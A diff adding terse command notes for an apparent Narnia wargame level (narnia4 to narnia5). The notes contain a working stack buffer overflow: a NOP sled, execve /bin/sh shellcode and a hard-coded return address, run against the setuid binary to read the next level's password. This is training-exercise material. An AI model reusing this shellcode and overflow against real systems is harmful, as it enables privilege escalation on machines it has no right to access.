@@ -62,6 +62,24 @@ chmod 777 /tmp/output
 /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output
 
 
+# narnia4 -> narnia5
+vim narnia4.c
+./narnia4
+gdb narnia4
+set disassembly-flavor intel
+disassemble main
+r $(python -c 'print "\x90"*300')
+x/300wx $esp
+r $(python -c 'print "\x90"*236 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"')
+q
+cd /tmp/zulu
+/narnia/narnia4 $(python -c 'print 236 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\xb4\xd7\xff\xff"') 
+whoami
+cat /etc/narnia_pass/narnia5
+
+
+
+
 
 
 
